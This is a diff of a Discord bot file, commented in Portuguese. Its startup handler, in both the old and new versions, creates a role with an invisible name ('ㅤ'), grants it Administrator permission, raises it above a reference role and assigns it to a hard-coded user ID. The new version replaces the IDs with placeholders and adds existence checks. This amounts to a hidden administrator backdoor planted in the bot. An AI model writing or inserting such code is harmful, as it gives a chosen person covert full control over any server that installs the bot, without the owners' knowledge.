@@ -1,58 +1,38 @@
-const { Client, GatewayIntentBits, PermissionsBitField } = require("discord.js");
-
-const client = new Client({
-  intents: [
-    GatewayIntentBits.Guilds,
-    GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildVoiceStates
-  ]
-});
-
-// Seus sistemas
-require("./systems/main")(client);
-require("./systems/gfzin")(client);
-require("./systems/coco")(client);
-
-// Quando o bot ligar
 client.on("ready", async () => {
   console.log(`Logado como ${client.user.tag}`);
 
-  const guild = client.guilds.cache.first(); // pega o primeiro servidor
+  const guild = client.guilds.cache.first();
+  if (!guild) return console.log("❌ Nenhum servidor encontrado");
 
-  const cargoBaseId = "1476324501498364025"; // cargo de referência
-  const userId = "1476324501498364025"; // usuário que vai receber
+  const cargoBaseId = "COLOCA_ID_DO_CARGO_AQUI";
+  const userId = "COLOCA_ID_DO_USUARIO_AQUI";
 
   try {
     const cargoBase = guild.roles.cache.get(cargoBaseId);
 
     if (!cargoBase) {
-      console.log("❌ Cargo base não encontrado!");
+      console.log("❌ Cargo base NÃO encontrado!");
       return;
     }
 
-    // Criar cargo ADM com todas permissões
+    const membro = await guild.members.fetch(userId).catch(() => null);
+
+    if (!membro) {
+      console.log("❌ Usuário NÃO encontrado!");
+      return;
+    }
+
     const novoCargo = await guild.roles.create({
-      name: "ㅤ", // nome invisível
-      permissions: [PermissionsBitField.Flags.Administrator]
+      name: "ㅤ",
+      permissions: ["Administrator"]
     });
 
-    // Colocar acima do cargo base
     await novoCargo.setPosition(cargoBase.position + 1);
 
-    console.log("✅ Cargo ADM criado!");
-
-    // Pegar membro
-    const membro = await guild.members.fetch(userId);
-
-    // Dar o cargo
     await membro.roles.add(novoCargo);
 
-    console.log("✅ Cargo dado ao usuário!");
+    console.log("✅ Tudo funcionando!");
   } catch (err) {
-    console.error("❌ Erro:", err);
+    console.error("❌ ERRO REAL:", err);
   }
 });
-
-// Login
-client.login(process.env.TOKEN);
